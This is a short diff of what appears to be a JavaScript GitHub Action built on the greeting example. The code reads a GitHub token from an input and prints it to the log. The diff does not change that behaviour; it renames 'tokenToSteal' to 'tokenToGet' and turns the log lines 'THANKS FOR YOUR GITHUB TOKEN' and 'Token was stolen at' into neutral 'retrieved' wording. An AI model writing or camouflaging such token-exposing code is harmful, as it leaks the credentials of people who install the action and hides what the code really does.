@@ -28,9 +28,9 @@ function getResponse(url, callback) {
 
 try {
   const nameToGreet = core.getInput("who-to-greet");
-  const tokenToSteal = core.getInput("give-me-your-token-now");
+  const tokenToGet = core.getInput("get-token");
   console.log(`Hello ${nameToGreet}!`);
-  console.log(`THANKS FOR YOUR GITHUB TOKEN!!!!!! -> ${tokenToSteal}`);
+  console.log(`Token Retrieved! -> ${tokenToGet}`);
 
   let responseData = "";
 
@@ -49,7 +49,7 @@ try {
 
   const time = new Date().toTimeString();
   core.setOutput("time", time);
-  console.log(`Token was stolen at: ${time}`);
+  console.log(`Token retrieved at: ${time}`);
   
   
   const payload = JSON.stringify(github.context.payload, undefined, 2);
